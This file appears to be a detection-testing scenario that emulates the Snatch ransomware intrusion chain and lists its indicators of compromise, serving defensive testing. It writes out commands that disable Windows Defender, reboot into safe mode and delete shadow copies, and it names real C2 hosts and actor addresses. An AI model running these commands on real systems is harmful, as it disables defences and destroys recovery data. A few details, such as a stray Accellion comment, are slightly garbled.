@@ -1,0 +1,468 @@
+title "Snatch Ransomware"
+author "Detecteam"
+description "The Snatch ransomware is a novel hybrid data theft-ransomware threat disables security protections by rebooting Windows machines mid-attack. What we refer to as Snatch malware comprises a collection of tooling, which include a ransomware component and a separate data stealer, both apparently built by the criminals who operate the malware; a Cobalt Strike reverse-shell; and several publicly-available tools that aren’t inherently malicious, but used more conventionally by penetration testers, system administrators, or technicians.All machines rebooted into safe mode before encrypting causing all logging and remote tools to fail"
+reference "https://thedfirreport.com/2020/06/21/snatch-ransomware/"
+reference "https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/"
+reference "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-263a"
+reference "https://www.cisa.gov/sites/default/files/2023-09/joint-cybersecurity-advisory-stopransomware-snatch-ransomware_0.pdf"
+
+revision 1
+status "development"
+
+#####################
+##tactics##
+
+##techniques##
+tag "mitre-attack = T1027"
+tag "mitre-attack = T1112"
+tag "mitre-attack = T1070.004"
+tag "mitre-attack = T1036.004"
+tag "mitre-attack = T1003.001"
+tag "mitre-attack = T1046"
+tag "mitre-attack = T1069"
+tag "mitre-attack = T1021.001"
+tag "mitre-attack = T1219"
+tag "mitre-attack = T1486"
+tag "mitre-attack = T1489"
+tag "mitre-attack = T1490"
+
+
+section global_variables "__hidden__" {
+
+    $scenario_name = "Snatch"
+    $scenario_desc = "The Snatch ransomware is a novel hybrid data theft-ransomware threat disables security protections by rebooting Windows machines mid-attack."
+
+    $computer.name = "beachhead"
+    $user.name = "johndoe"
+    $cidr_range = "192.168.1.0/24"
+    $server.name = "server"
+    $server.ip = "192.168.1.254"
+    $admin_id = "administrator"
+    $admin_password = random.string(8)
+
+    $event_platform = "Win"
+
+    $uniquely_CID = random.string(5)
+    $ransomware_binarypack = "${uniquely_CID}_pack.exe"
+    $ransomware_binary = "${uniquely_CID}_unpack.exe"
+    $ransomware_notes = [
+        "DECRYPT_${uniquely_CID}_DATA.txt",
+        "README_${uniquely_CID}_FILES.txt",
+        "RESTORE_${uniquely_CID}_FILES.txt",
+        "HOW TO RESTORE YOUR ${uniquely_CID} FILES.txt"
+    ]
+
+    $snatch_agents = [
+        $ransomware_binarypack,
+        $ransomware_binary,
+        "safe.exe",
+        "cplXen.exe",
+        "WmiPrvSystemES.exe"
+    ]
+
+    $ransomware_note = random($ransomware_notes)
+
+    $crypt_extension = "${uniquely_CID}"
+
+
+    $registry_keys = [
+        """HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\SuperBackupMan:Default:Service"""
+    ]
+
+    $ransomware_commands_before_reboot = [
+        """bcdedit.exe /set {current} safeboot minimal""",
+        """shutdown.exe /r /f /t 00"""
+    ]
+
+    $ransomware_commands_after_reboot = [
+        """net stop SuperBackupMan""",
+        """vssadmin delete shadows /all /quiet"""
+    ]
+
+
+    $ransomware_rdp_ips = [
+        "193.70.12.240",
+        "178.162.209.135"
+    ]
+
+    $ransomware_c2_server = "91.229.77.161"
+
+    $listofunits = [
+        "c",
+        "d",
+        "e",
+        "f",
+        "g",
+        "h",
+        "i",
+        "j",
+        "k",
+        "l",
+        "m",
+        "n",
+        "o",
+        "p",
+        "q",
+        "r",
+        "s",
+        "t",
+        "u",
+        "v",
+        "w",
+        "x",
+        "y",
+        "z"
+    ]
+
+    $base_folders = [
+        """Users\Default\Desktop""",
+        """Users\Default\Documents""",
+        """Users\johndoe\Desktop""",
+        """Users\johndoe\Documents""",
+        """Users\Administrator\Desktop""",
+        """Users\Administrator\Documents""",
+        """shared""",
+        """finance"""
+    ]
+
+    $random_extensions = [
+        "doc",
+        "docx",
+        "xls",
+        "xlsx",
+        "ppt",
+        "pptx",
+        "pdf",
+        "jpeg",
+        "jpg",
+        "gif",
+        "png",
+        "bmp",
+        "txt",
+        "md",
+        "info",
+        "json",
+        "yaml",
+        "yml",
+        "java",
+        "js",
+        "sh",
+        "py",
+        "sql",
+        "html",
+        "htm"
+    ]
+
+}
+
+section start "Start" {}
+
+section initial_access "Initial Access and Persistence" {
+    tag "mitre-att&ck:enterprise = T1133"
+    tag "mitre-att&ck:enterprise = T1110.001"
+    tag "mitre-att&ck:enterprise = T1078"
+    # Snatch threat actors employ several different methods to gain access to and maintain persistence on
+    # a victim’s network. Snatch affiliates primarily rely on exploiting weaknesses in Remote Desktop
+    # Protocol (RDP) [T1133] for brute-forcing and gaining administrator credentials to victims’ networks
+    # [T1110.001]. In some instances, Snatch affiliates have sought out compromised credentials from
+    # criminal forums/marketplaces [T1078].
+    loop 250 {
+        step rdp_connection_failed group "bruteforce" {
+            $last_range = random.int(1, 253)
+            $destination.ip = ip.cidr($cidr_range, $last_range)
+            $source.ip = random($ransomware_rdp_ips)
+            action RDP.LoginFailed
+        }
+        sleep random.float(0.2, 1.5)
+    }
+    step rdp_connection_success group "bruteforce" {
+        action RDP.LoginSuccess
+    }
+
+    sleep 60
+
+    step arp_command {
+        $process.parent.command_line = "cmd.exe"
+        $process.command_line = "arp -a"
+        action Process.Start
+    }
+
+
+    tag "mitre-att&ck:enterprise = T1078.002"
+    tag "mitre-att&ck:enterprise = T1071.001"
+    tag "mitre-att&ck:enterprise = T1583.003"
+    tag "mitre-att&ck:enterprise = T1133"
+    # Snatch threat actors gain persistence on a victim’s network by compromising an administrator
+    # account [T1078.002] and establishing connections over port 443 [T1071.001] to a command and
+    # control (C2) server located on a Russian bulletproof hosting service [T1583.003]. Per IP traffic from
+    # event logs provided by recent victims, Snatch threat actors initiated RDP connections from a Russian
+    # bulletproof hosting service and through other virtual private network (VPN) services [T1133]
+    loop $snatch_agents as $agent {
+        step download_agents {
+            $file.name = $agent
+            action File.Create
+        }
+    }
+
+    sleep 1800 # 30 minutes later
+
+
+    # TOR RDP Tunnel
+    step dc_wmi_command {
+        $process.parent.command_line = "cplXen.exe"
+        $process.command_line = """C:\Windows\wmis\WmiPrvSystemES.ex --nt-service -f C:\Windows\wmis\libeay32.dat"""
+        action Process.Start
+    }
+
+    $several_rdp_connections = random.int(10,50)
+    # Lateral Movement: Manual RDP access to network servers
+    loop $several_rdp_connections {
+        sleep 60
+        step lateral_movement_rdp {
+            $ru_cidr = ip.country_to_cidr("RU")
+            $source.ip = ip.cidr($ru_cidr, 7)
+            action RDP.LoginSuccess
+        }
+    }
+}
+
+section data_discovery_lat_movement "Data Discovery and Lateral Movement" {
+# Snatch threat actors were observed using different TTPs to discover data, move laterally, and search
+# for data to exfiltrate. Snatch threat actors use sc.exe to configure, query, stop, start, delete, and add
+# system services using the Windows Command line. In addition to sc.exe, Snatch threat actors also
+# use tools such as Metasploit and Cobalt Strike [S0154].
+
+# Prior to deploying the ransomware, Snatch threat actors were observed spending up to three months
+# on a victim’s system. Within this timeframe, Snatch threat actors exploited the victim’s network
+# [T1590], moving laterally across the victim’s network with RDP [T1021.001] for the largest possible
+# deployment of ransomware and searching for files and folders [T1005] for data exfiltration [TA0010]
+# followed by file encryption [T1486]
+    ### Reverse Shell 
+    loop $several_rdp_connections {
+        sleep 60
+        step reverse_shell_connection {
+            $protocol = "https"
+            $destination.ip = $ransomware_c2_server
+            $destination.port = 443
+            run HTTPConnection        
+        }
+    }
+
+
+    sleep 5
+
+
+    loop $registry_keys as $key2add {
+        $key_info = string.split($key2add,":")
+        $hive_value = string.split($key_info[1],"\\")
+        step persistence_REG_KEY {
+            $process.name = "reg.exe"
+            $registry.hive = $hive_value
+            $registry.key = $key_info[1]
+            $registry.value = $key_info[2]
+            $registry.data = $key_info[3]
+            action Windows.Registry.Create
+        }
+    }
+
+    $registryKey="""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree"""
+    step scheduled_task {
+        $process.name = "reg.exe"
+        $registry.data = """C:\USERS\${ransomware_binary}"""
+        $registry.hive = "HKEY_LOCAL_MACHINE"
+        $registry.key = $registryKey
+        action Windows.Registry.Create
+    }
+
+    # 45 minutes later
+    sleep 2700
+
+    # Stop Windows Defender
+    $win_defender_off="sc stop WinDefend"
+    step turn_off_windows_defender {
+        $process.command_line = $win_defender_off
+        action Process.Start
+    }
+
+    loop $ransomware_commands_before_reboot as $comand2run {
+        step before_reboot_commands {
+            $process.command_line = $comand2run
+            action Process.Start        
+        }
+    }
+
+    # Rebooted machines
+    sleep 180
+
+    loop $ransomware_commands_after_reboot as $comand2run {
+        step after_reboot_commands {
+            $process.command_line = $comand2run
+            action Process.Start
+        }
+    }
+
+}
+
+sleep 10
+
+section defense_evasion_exec "Defense Evasion and Execution" {
+# During the early stages of ransomware deployment, Snatch threat actors attempt to disable antivirus
+# software [T1562.001] and run an executable as a file named safe.exe or some variation thereof. In
+# recent victims, the ransomware executable’s name consisted of a string of hexadecimal characters
+# which match the SHA-256 hash of the file in an effort to defeat rule-based detection [T1036]. Upon
+# initiation, the Snatch ransomware payload queries and modifies registry keys [T1012][T1112], uses
+# various native Windows tools to enumerate the system [T1569.002], finds processes [T1057], and
+# creates benign processes to execute Windows batch (.bat) files [T1059.003]. In some instances, the
+# program attempts to remove all the volume shadow copies from a system [T1490]. After the execution
+# of the batch files, the executable removes the batch files from the victim’s filesystem [T1070.004].
+#
+# The Snatch ransomware executable appends a series of hexadecimal characters to each file and
+# folder name it encrypts—unique to each infection—and leaves behind a text file titled HOW TO
+# RESTORE YOUR FILES.TXT in each folder. Snatch threat actors communicate with their victims
+# through email and the Tox communication platform based on identifiers left in ransom notes or
+# through their extortion blog. Since November 2021, some victims reported receiving a spoofed call
+# from an unknown female who claimed association with Snatch and directed them to the group’s
+# extortion site. In some instances, Snatch victims had a different ransomware variant deployed on their
+# systems, but received a ransom note from Snatch threat actors. As a result, the victims’ data is
+# posted on the ransomware blog involving the different ransomware variant and on the Snatch threat
+# actors’ extortion blog.
+    $total_folders = random.int(50,300)
+    loop $total_folders {
+        $random_folder_length=random.int(6,40)
+        $randomUnit = random($listofunits)
+        $randomParentFolder = random($base_folders)
+        $random_subfolder=random.string($random_folder_length)
+        
+        $total_files = random.int(5,60)
+        loop $total_files {
+            $random_filename=random.string($random_folder_length)
+            $random_extension = random($random_extensions)
+            $random_file= """${randomUnit}:\${randomParentFolder}\${random_subfolder}\${random_filename}.${random_extension}.${crypt_extension}"""
+            step encrypted_file_created {
+                $file.name = $random_file
+                action File.Create
+            }
+        }
+        sleep 600
+        $random_note = """${randomUnit}:\${randomParentFolder}\${random_subfolder}\${ransomware_note}"""
+        step ransomware_note_created {
+            $file.name = $random_note
+            action File.Create
+        }
+        sleep 2
+    }
+}
+
+
+section end "End" {}
+
+
+#################################
+#    Indicators Of Compromise   #
+#################################
+
+section ioc "__hidden__" {
+    # Accellion File Transfer Appliance (FTA) vulnerabilities
+    $vulns_list = [
+    ]
+
+    # MITRE ATT&CK Techniques
+    $mitre_att_ck_ttps = [
+        "T1027",
+        "T1112",
+        "T1070.004",
+        "T1036.004",
+        "T1003.001",
+        "T1046",
+        "T1069",
+        "T1021.001",
+        "T1219",
+        "T1486",
+        "T1489",
+        "T1490"
+    ]
+
+    $mitre_att_info = [
+        "Obfuscated Files or Information|T1027",
+        "Modify Registry|T1112",
+        "Indicator Removal: File Deletion|T1070.004",
+        "Masquerade Task or Service|T1036.004",
+        "OS Credential Duping: LSASS Memory|T1003.001",
+        "Network Service Discovery|T1046",
+        "Permission Groups Discovery|T1069",
+        "Remote Desktop Protocol|T1021.001",
+        "Remote Access Software|T1219",
+        "Data Encrypted for Impact|T1486",
+        "Service Stop|T1489",
+        "Inhibit System Recovery|T1490"
+    ]
+
+
+    $ransomware_commands = [
+        """bcdedit.exe /set {current} safeboot minimal""",
+        """shutdown.exe /r /f /t 00""",
+        """net stop SuperBackupMan""",
+        """vssadmin delete shadows /all /quiet"""
+    ]
+
+    $sha256 = [
+        "eebc57e9e683a3c5391692c1c3afb37f3cb539647f02ddd09720979426790f56",
+        "78816ea825209162f0e8a1aae007691f9ce39f1f2c37d930afaf5ac3af78e852",
+        "80cc8e51b3b357cfc7115e114cecabc5442c12c143a7a18ab464814de7a66ab4",
+        "ebcded04429c4178d450a28e5e190d6d5e1035abcd0b2305eab9d29ba9c0915a",
+        "fe8ba1eaf69b1eba578784d5ab77e54caae9d90c2fb95ad2baaaef6b69a2d6cb",
+        "28125dae3ab7b11bd6b0cbf318fd85ec51e75bca5be7efb997d5b950094cd184",
+        "0ce4c4af321ff02928aacf105f03dead87e85003080586615755f278770f5adb",
+        "36a4311ef332b0b5db62f8fcabf004fdcfbbde62f791839a8be0314604d814c4",
+        "d0ddc221b958d9b4c7d9612dd2577bec35d157b41aa50210c2ae5052d054ff33",
+        "e8931967ed5a4d4e0d7787054cddee8911a7740b80373840b276f14e36bda57d",
+        "ae9cdbb717625506ed0df7af153dc2741395655aeb1da2f91079e3ea616af6a1",
+        "5f24536e48f406177a9a630b0140baadff1e29f36b02095b25e7e21c146098bb",
+        "c0f506e98f416412b3a9dcd018341afab15e36b15bac89d3b02ff773b6cc85a6",
+        "36a4311ef332b0b5db62f8fcabf004fdcfbbde62f791839a8be0314604d814c4",
+        "8c9fab558b3e9e21936a91422d9e2666f210c5fd7d9b0fd08d2353adb64a4c00",
+        "329f295b8aa879bedd68cf700cecc51f67feee8fd526e2a7eab27e216aa8fcaa",
+        "ab6b0d00ba8f8553c015743b9da8761a9b1fca750d3f73bda573a8fbc47dafa1",
+        "63c2c1ad4286dbad927358f62a449d6e1f9b1aa6436c92a2f6031e9554bed940",
+        "d22b46ea682838e0b98bc6a1e36fd04f0672fe889c03d227cdeb5dcc5d76ae7c"
+    ]
+
+    $c2_servers = [
+        "193.70.12.240",
+        "91.229.77.161:443",
+        "193.188.22.29:443",
+        "193.188.22.29:37462",
+        "193.188.22.26",
+        "193.188.22.25",
+        "67.211.209.151:3306",
+        "37.59.146.180",
+        "45.147.228.91",
+        "185.61.149.242",
+        "94.140.125.150",
+        "mydatasuperhero.com",
+        "mydatassuperhero.com",
+        "snatch24uldhpwrm.onion",
+        "snatch6brk4nfczg.onion"
+    ]
+
+    $contact_email = [
+        """imBoristheBlade@protonmail.com""",
+        """jimmtheworm@dicksinmyan.us""",
+        """doctor666@mail.fr""",
+        """doctor666@cock.li""",
+        """newrecoveryrobot@pm.me"""
+    ]
+
+    $go_build_id = [
+        """9sbGxHyc5vSAXzwvg6iZ/c_gG_xy9d6xmNt9nMlii/HdKHUjGFLxliYJycPc5E/yTT_FNpw78SfII62lGUn""",
+        """2KZVw_piBNB6c74hlRt4/ueMyrcUcK4ismcjykWop/ZQYGFEYcaBSofxZbcs4g/GK-7e3PY8vHyy_lSkbVi""",
+        """jPF3Jrx2uZ7VjN0GyDBL/x3B31XZylJgOhAVFZiym/o_aCHMB9kgaxIibXVOox/VQQhgCuLOuABGRrXzFdl""",
+        """ULgusZVAlPcWOJcj9LKW/fOp_xyXqQQO5nzk3CZIW/LV-l8Ye8SLuN39dCmiDH/_34hEcu3a_yVC0sdeBdP""",
+        """BIFnB6MdgF4djhq39TIM/0F-O_BMJNaIkMOFRC1kQ/j2Fm9d-Ilq-6KP4f1cuF/I07Xn6PJTdAcrP3IsVX4""",
+        """cN2S005MM6pjpFXzNYd7/Lu1OzfnOLXKCy8mQdge9/GnIsH3q8hyF-pEAWP4K0/ISXM5yfoGT6hDQpcP08E""",
+        """jPF3Jrx2uZ7VjN0GyDBL/x3B31XZylJgOhAVFZiym/o_aCHMB9kgaxIibXVOox/VQQhgCuLOuABGRrXzFdl""",
+        """D4uZyyRaOm8WP2m599HU/gZkWHWmCm-S2lk0u6tJQ/F9Wz3xBbUlF3TISfF8Gu/uPBkEF2KfTla4ver6O79""",
+        """nz4NhyAgWYITxG9Gw5rT/an0sbWQDT73tZEat72I5/KKmIcIIeFCNSYj4p5koW/BHky2GAanYgZQqXGSyei"""
+    ]
+
+}
